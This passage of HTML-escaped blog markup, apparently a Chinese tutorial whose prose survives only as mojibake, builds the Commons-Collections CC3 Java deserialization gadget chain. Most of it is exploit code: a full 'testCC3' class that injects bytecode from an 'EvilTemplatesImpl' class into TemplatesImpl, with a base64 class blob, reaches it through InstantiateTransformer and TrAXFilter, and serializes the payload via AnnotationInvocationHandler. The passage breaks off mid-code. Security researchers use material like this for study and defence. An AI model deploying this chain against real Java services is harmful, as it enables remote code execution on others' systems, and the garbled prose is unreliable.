&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯å¹¶ä¸æ˜¯æ ‡å‡†çš„payloadï¼Œysoserialä¸­å¹¶æ²¡æœ‰ç”¨åˆ°InvokerTransformerï¼ŒåŸå› æ˜¯&lt;code>SerialKiller&lt;/code>çš„å­˜åœ¨é™åˆ¶äº†å®ƒï¼Œæˆ‘ä»¬æ¢ä¸º&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/code>&lt;/p>
&lt;p>è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†äº†&lt;code>(TransformerImpl) templates.newTransformer()&lt;/code>ï¼Œå…å»äº†æˆ‘ä»¬çš„æ‰‹å·¥è°ƒç”¨&lt;/p>
&lt;p>ç¼ºå°‘InvokerTransformeræ— æ³•è°ƒç”¨TraAXFilterçš„æ„é€ æ–¹æ³•ï¼Œè¿™é‡Œç”¨&lt;code>org.apache.commons.collections.functors.InstantiateTransformer&lt;/code>è¿™ä¸ªTransformer&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨&lt;code>InstantiateTransformer&lt;/code>è°ƒç”¨åˆ°&lt;code>TrAXFilter&lt;/code>çš„æ„é€ æ–¹æ³•ï¼Œå†åˆ©ç”¨å®ƒæ„é€ æ–¹æ³•ä¸­çš„&lt;code>templates.newTransformer&lt;/code>è°ƒç”¨åˆ°&lt;code>TemplatesImpl&lt;/code>é‡Œçš„å­—èŠ‚ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®Œæ•´CC3&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.xml.transform.Templates&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// setFieldValue(obj, &amp;#34;_bytecodes&amp;#34;, new byte[][]{Base64.getDecoder().decode(&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;)});
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
